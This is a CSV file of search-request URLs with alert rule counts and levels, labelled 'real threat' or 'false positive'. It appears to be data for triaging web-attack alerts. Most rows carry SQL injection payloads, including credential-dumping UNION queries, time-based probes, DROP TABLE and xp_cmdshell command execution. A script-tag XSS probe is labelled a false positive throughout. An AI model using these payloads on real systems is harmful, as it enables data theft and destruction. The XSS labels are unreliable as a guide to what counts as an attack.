_source.data.url,_source.rule.firedtimes,_source.rule.level,label
/search?q=%27%3B+SELECT+%2A+FROM+admin--,13,6,real threat
"/search?q=""test""",3,8,false positive
/search?q=' OR pg_sleep(5)--,4,16,real threat
/search?q=%27--,14,12,real threat
"/search?q=""test""",4,6,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,1,6,real threat
/search?q='DROP',5,5,false positive
"/search?q=""test""",4,8,false positive
/search?q=admin,4,6,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,12,10,real threat
/search?q=%27+OR+1%3D1--,7,12,real threat
"/search?q=' UNION SELECT username, password FROM users--",13,14,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,7,13,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,15,20,real threat
/search?q=' OR 1=1 LIMIT 1--,8,13,real threat
/search?q=%27--,5,11,real threat
/search?q=' OR 1=1;#,10,14,real threat
/search?q=' OR SLEEP(5)--,3,6,real threat
/search?q=1',2,5,false positive
/search?q=' AND '1'='2,8,16,real threat
/search?q=' UNION SELECT null--,3,12,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,13,13,real threat
/search?q=' AND 1=1--,3,20,real threat
/search?q=' OR SLEEP(5)--,14,10,real threat
/search?q=',4,7,false positive
/search?q=%3Ctest%3E,3,7,false positive
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",13,14,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,3,11,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",10,10,real threat
/search?q=' OR 1=1;#,3,6,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,15,12,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,7,12,real threat
/search?q=admin,3,7,false positive
/search?q=' OR pg_sleep(5)--,13,15,real threat
/search?q=' OR 'a'='a,1,20,real threat
/search?q=' AND 1=2--,14,11,real threat
/search?q='%',2,8,false positive
/search?q=%27+OR+%271%27%3D%271,12,20,real threat
/search?q=%27+OR+%271%27%3D%271,10,12,real threat
/search?q=%27+AND+1%3D2--,13,6,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,6,14,real threat
/search?q='',5,6,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,10,15,real threat
/search?q=' OR SLEEP(5)--,9,11,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,1,6,real threat
/search?q=' OR 1=1/*,7,14,real threat
/search?q=%27+OR+%271%27%3D%271,10,11,real threat
/search?q=%27+AND+1%3D2--,11,6,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,9,16,real threat
/search?q=%3Ctest%3E,5,7,false positive
/search?q=admin,4,5,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,14,16,real threat
/search?q='',2,7,false positive
/search?q=' OR 'a'='a,9,12,real threat
/search?q='%',2,5,false positive
/search?q=1',5,7,false positive
/search?q=<script>alert(1)</script>,4,7,false positive
/search?q='DROP',1,6,false positive
/search?q=' OR '1'='1,2,12,real threat
/search?q=admin,5,6,false positive
/search?q=' OR ''=',8,14,real threat
/search?q=' OR 1=1;#,5,12,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,14,10,real threat
/search?q='OR',4,8,false positive
/search?q='; EXEC xp_cmdshell('dir')--,11,11,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,2,13,real threat
/search?q=admin,1,7,false positive
"/search?q=' UNION SELECT username, password FROM users--",12,11,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",11,10,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,5,14,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",14,20,real threat
/search?q=' OR 1=1 -- -,4,14,real threat
/search?q=<script>alert(1)</script>,5,6,false positive
/search?q='; WAITFOR DELAY '0:0:5'--,2,11,real threat
/search?q=' OR 1=1/*,14,11,real threat
/search?q=' OR pg_sleep(5)--,14,12,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,13,15,real threat
/search?q='',4,7,false positive
/search?q=%27--,8,14,real threat
/search?q='abc',2,5,false positive
/search?q=' OR pg_sleep(5)--,8,13,real threat
/search?q=' OR 'a'='a,2,12,real threat
/search?q='',3,7,false positive
/search?q=' OR 1=1/*,9,16,real threat
/search?q=%27+OR+%271%27%3D%271,8,12,real threat
/search?q='',3,8,false positive
/search?q='',1,7,false positive
/search?q='; SELECT * FROM admin--,6,11,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,2,12,real threat
/search?q=admin,1,7,false positive
/search?q=' AND '1'='2,15,14,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,6,20,real threat
/search?q='',5,7,false positive
/search?q=' OR pg_sleep(5)--,15,11,real threat
/search?q=' OR pg_sleep(5)--,15,14,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,6,20,real threat
/search?q=admin,4,6,false positive
/search?q='',1,5,false positive
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",10,14,real threat
/search?q=' OR 1=1#,9,15,real threat
/search?q=' OR pg_sleep(5)--,10,10,real threat
/search?q=%27+UNION+SELECT+null--,3,16,real threat
/search?q=<script>alert(1)</script>,3,7,false positive
/search?q=' OR 'a'='a,15,15,real threat
/search?q='OR',4,8,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,6,14,real threat
/search?q='%',5,8,false positive
"/search?q=""test""",4,8,false positive
"/search?q=""test""",2,6,false positive
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,1,11,real threat
/search?q='=',3,6,false positive
/search?q='; WAITFOR DELAY '0:0:5'--,2,20,real threat
/search?q='abc',5,8,false positive
/search?q=admin,5,5,false positive
/search?q='; WAITFOR DELAY '0:0:5'--,4,11,real threat
/search?q='=',4,6,false positive
/search?q=' OR 1=1;#,7,6,real threat
/search?q=' OR 'a'='a,1,11,real threat
/search?q=' OR 'a'='a,12,20,real threat
"/search?q=""test""",4,8,false positive
/search?q=%27+OR+1%3D1--,7,20,real threat
"/search?q=""test""",3,6,false positive
/search?q=%27+AND+1%3D2--,12,13,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,15,13,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,15,10,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,6,10,real threat
/search?q=' OR pg_sleep(5)--,10,15,real threat
/search?q=%27+OR+%271%27%3D%271,4,11,real threat
/search?q=' OR 1=1 -- -,13,16,real threat
/search?q='%',2,6,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,7,14,real threat
/search?q=' OR 'a'='a,5,13,real threat
/search?q=' OR 1=1;#,11,14,real threat
/search?q=' AND 1=1--,14,13,real threat
/search?q='=',2,6,false positive
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,8,14,real threat
/search?q=%3Ctest%3E,4,6,false positive
/search?q=%27--,13,15,real threat
/search?q=',4,6,false positive
/search?q='=',1,5,false positive
/search?q='=',4,8,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,13,15,real threat
/search?q=' OR 'a'='a,9,16,real threat
/search?q='abc',3,6,false positive
/search?q=' OR 1=1; --,9,13,real threat
/search?q=',5,5,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,2,6,real threat
/search?q='OR',2,5,false positive
/search?q='abc',5,8,false positive
/search?q='; DROP TABLE users--,7,15,real threat
/search?q='',2,7,false positive
/search?q=' OR 1=1 -- -,15,15,real threat
/search?q='; DROP TABLE users--,6,13,real threat
/search?q=admin,3,6,false positive
"/search?q=""test""",2,7,false positive
/search?q=',4,8,false positive
/search?q=%27+OR+1%3D1--,6,15,real threat
/search?q=' OR 1=1; --,11,14,real threat
"/search?q=' UNION SELECT username, password FROM users--",3,13,real threat
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,11,20,real threat
/search?q='%',1,8,false positive
/search?q=admin,4,5,false positive
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,5,6,real threat
/search?q='; DROP TABLE users--,4,16,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,14,12,real threat
/search?q='; SELECT * FROM admin--,14,14,real threat
/search?q='%',4,7,false positive
/search?q=' OR 'x'='x'#,14,16,real threat
/search?q=',5,6,false positive
/search?q=' OR EXISTS(SELECT * FROM users)--,8,14,real threat
/search?q=%27+OR+%271%27%3D%271,9,11,real threat
/search?q='; EXEC xp_cmdshell('dir')--,13,16,real threat
/search?q=',5,6,false positive
/search?q=' OR pg_sleep(5)--,14,16,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",1,12,real threat
/search?q='%',5,6,false positive
/search?q=' OR 1=1;#,6,6,real threat
/search?q='',5,5,false positive
/search?q=%27%3B+DROP+TABLE+users--,13,14,real threat
/search?q='; DROP TABLE users--,11,20,real threat
/search?q=' OR 1=1 LIMIT 1--,8,15,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",10,6,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",3,11,real threat
/search?q=' OR ''=',14,13,real threat
/search?q=<script>alert(1)</script>,4,7,false positive
/search?q=' OR pg_sleep(5)--,3,11,real threat
/search?q=admin,3,5,false positive
/search?q='abc',4,7,false positive
/search?q='; EXEC xp_cmdshell('dir')--,8,6,real threat
/search?q=' OR pg_sleep(5)--,12,20,real threat
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,12,12,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,12,10,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,11,15,real threat
"/search?q=' UNION SELECT username, password FROM users--",8,14,real threat
/search?q=%27+OR+%271%27%3D%271,15,15,real threat
/search?q=',4,8,false positive
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,5,13,real threat
/search?q=%3Ctest%3E,1,8,false positive
/search?q=<script>alert(1)</script>,4,6,false positive
/search?q=%27+UNION+SELECT+null--,1,16,real threat
/search?q=admin,3,7,false positive
/search?q='%',3,6,false positive
"/search?q=' UNION SELECT username, password FROM users--",2,12,real threat
/search?q=' OR 'x'='x'--,3,13,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,7,11,real threat
/search?q=' OR SLEEP(5)--,5,11,real threat
/search?q=' OR 1=1#,14,20,real threat
/search?q=' OR SLEEP(5)--,12,15,real threat
/search?q=admin,3,5,false positive
/search?q=%27%3B+DROP+TABLE+users--,11,20,real threat
/search?q='OR',3,5,false positive
/search?q=' OR pg_sleep(5)--,10,10,real threat
/search?q='DROP',5,5,false positive
/search?q=<script>alert(1)</script>,1,7,false positive
/search?q=%27+OR+1%3D1--,14,13,real threat
"/search?q=' UNION SELECT username, password FROM users--",11,14,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,11,6,real threat
/search?q='OR',2,7,false positive
/search?q=' OR ''=',6,10,real threat
/search?q=' OR 1=1 -- -,2,11,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",2,14,real threat
/search?q=%27+UNION+SELECT+null--,14,20,real threat
/search?q=' AND 1=2--,1,20,real threat
/search?q='DROP',2,8,false positive
/search?q=%27+OR+%271%27%3D%271,1,11,real threat
/search?q=' OR 'a'='a,4,6,real threat
/search?q='; SELECT * FROM admin--,4,14,real threat
/search?q='; DROP TABLE users--,2,11,real threat
/search?q=' OR ''=',5,16,real threat
/search?q=' OR 'x'='x'#,14,14,real threat
/search?q='%',4,6,false positive
/search?q=' OR 1=1 LIMIT 1--,13,13,real threat
/search?q=' OR 'x'='x'--,12,16,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,6,11,real threat
/search?q=' UNION SELECT null--,6,13,real threat
/search?q=' AND 1=1--,13,12,real threat
/search?q=' OR ''=',11,15,real threat
"/search?q=' UNION SELECT username, password FROM users--",14,11,real threat
/search?q=',5,8,false positive
/search?q=' OR 1=1;#,8,13,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,6,11,real threat
/search?q='=',2,5,false positive
/search?q=' OR 'x'='x'--,1,11,real threat
/search?q='abc',2,5,false positive
/search?q=' OR 1=1 -- -,13,6,real threat
/search?q='OR',1,5,false positive
/search?q=' OR 1=1 LIMIT 1--,5,20,real threat
/search?q='%',2,5,false positive
/search?q=' OR pg_sleep(5)--,14,20,real threat
/search?q='',5,5,false positive
/search?q=' OR 'x'='x'#,7,11,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,4,15,real threat
/search?q=' OR 1=1 -- -,15,14,real threat
/search?q=%3Ctest%3E,2,8,false positive
/search?q=' UNION SELECT null--,3,14,real threat
/search?q='; SELECT * FROM admin--,10,10,real threat
/search?q='DROP',2,8,false positive
/search?q='DROP',2,5,false positive
/search?q=%3Ctest%3E,1,5,false positive
/search?q=%3Ctest%3E,2,8,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,3,10,real threat
/search?q='',1,6,false positive
"/search?q=""test""",5,7,false positive
/search?q='abc',4,6,false positive
/search?q='OR',2,7,false positive
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,2,10,real threat
/search?q=' OR 1=1 LIMIT 1--,14,11,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,11,20,real threat
/search?q=<script>alert(1)</script>,3,7,false positive
/search?q=<script>alert(1)</script>,1,7,false positive
/search?q=%3Ctest%3E,4,6,false positive
/search?q='=',1,8,false positive
/search?q='=',1,6,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",14,15,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,2,20,real threat
/search?q='abc',4,8,false positive
/search?q=admin,2,8,false positive
/search?q=' OR 1=1 -- -,14,11,real threat
/search?q='abc',3,8,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",4,14,real threat
/search?q='',3,7,false positive
/search?q=' AND '1'='2,8,12,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,6,15,real threat
/search?q=' OR 'x'='x'--,3,6,real threat
/search?q=' OR 1=1 -- -,2,6,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,5,11,real threat
/search?q=%27--,2,15,real threat
/search?q='=',2,8,false positive
/search?q=%27--,11,14,real threat
/search?q=' OR 'x'='x'--,9,11,real threat
/search?q=' OR 'x'='x'#,10,6,real threat
/search?q='%',1,6,false positive
/search?q='',5,7,false positive
/search?q='; WAITFOR DELAY '0:0:5'--,14,10,real threat
/search?q='',3,7,false positive
/search?q=' AND 1=2--,7,13,real threat
/search?q=' OR 'x'='x'--,2,14,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,12,20,real threat
/search?q='%',2,5,false positive
/search?q=admin,3,7,false positive
/search?q=1',2,7,false positive
/search?q=' OR EXISTS(SELECT * FROM users)--,2,13,real threat
/search?q='=',4,5,false positive
"/search?q=""test""",4,5,false positive
/search?q='%',5,8,false positive
/search?q=%27+UNION+SELECT+null--,7,20,real threat
/search?q='OR',2,6,false positive
/search?q=' OR 'a'='a,5,10,real threat
/search?q=' AND '1'='2,12,12,real threat
/search?q=%27+OR+%271%27%3D%271,4,14,real threat
/search?q=' UNION SELECT null--,2,16,real threat
/search?q=' OR 1=1; --,7,12,real threat
/search?q='OR',5,5,false positive
/search?q='; EXEC xp_cmdshell('dir')--,15,14,real threat
/search?q='; EXEC xp_cmdshell('dir')--,1,13,real threat
/search?q=' OR 1=1 -- -,7,20,real threat
/search?q=' OR 1=1;#,13,16,real threat
/search?q=%27--,15,15,real threat
/search?q=' OR SLEEP(5)--,3,15,real threat
/search?q=' OR 1=1--,15,15,real threat
/search?q='=',2,8,false positive
/search?q=admin,2,5,false positive
/search?q=%27+UNION+SELECT+null--,11,15,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,12,6,real threat
/search?q=',5,8,false positive
/search?q=%27+OR+%271%27%3D%271,3,13,real threat
"/search?q=""test""",4,7,false positive
/search?q=%27+AND+1%3D2--,15,12,real threat
/search?q='abc',5,5,false positive
/search?q=%3Ctest%3E,2,5,false positive
/search?q=<script>alert(1)</script>,4,5,false positive
/search?q=1',5,6,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",9,12,real threat
/search?q='; DROP TABLE users--,12,13,real threat
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,8,13,real threat
/search?q='DROP',4,7,false positive
/search?q=<script>alert(1)</script>,2,5,false positive
/search?q=%27+AND+1%3D2--,4,15,real threat
"/search?q=' UNION SELECT username, password FROM users--",11,16,real threat
/search?q=' OR 1=1; --,9,15,real threat
/search?q=' OR 1=1/*,8,13,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",5,11,real threat
/search?q=' OR 'a'='a,7,11,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,1,11,real threat
/search?q=' AND '1'='2,8,10,real threat
/search?q=1',5,6,false positive
/search?q=<script>alert(1)</script>,3,8,false positive
/search?q=' OR 'a'='a,13,13,real threat
/search?q=' OR 1=1/*,5,13,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,14,20,real threat
/search?q='; DROP TABLE users--,14,16,real threat
/search?q=%27+AND+1%3D2--,5,20,real threat
/search?q=' UNION SELECT null--,8,20,real threat
/search?q='; EXEC xp_cmdshell('dir')--,11,10,real threat
/search?q=admin,2,8,false positive
/search?q=',3,5,false positive
/search?q='%',2,6,false positive
/search?q='abc',2,6,false positive
/search?q='abc',1,5,false positive
/search?q=%27--,9,10,real threat
/search?q=' OR SLEEP(5)--,5,15,real threat
/search?q='abc',3,7,false positive
/search?q=' UNION SELECT null--,3,12,real threat
/search?q=' OR ''=',1,15,real threat
/search?q=<script>alert(1)</script>,4,5,false positive
/search?q=' OR 'x'='x'--,4,14,real threat
/search?q=' UNION SELECT null--,14,13,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,3,13,real threat
/search?q=' OR pg_sleep(5)--,12,13,real threat
/search?q=<script>alert(1)</script>,4,5,false positive
/search?q=%27+AND+1%3D2--,14,12,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,3,10,real threat
/search?q=' AND 1=2--,9,20,real threat
/search?q=1',3,5,false positive
/search?q=' OR 1=1; --,8,20,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,2,10,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",5,12,real threat
/search?q=' OR 1=1 -- -,2,16,real threat
/search?q=' OR 1=1/*,4,20,real threat
/search?q='OR',1,7,false positive
/search?q=%27--,13,10,real threat
/search?q='DROP',2,8,false positive
/search?q=' OR pg_sleep(5)--,7,11,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,12,20,real threat
/search?q=' OR ''=',7,16,real threat
/search?q=%3Ctest%3E,5,8,false positive
/search?q='OR',2,5,false positive
/search?q='OR',1,7,false positive
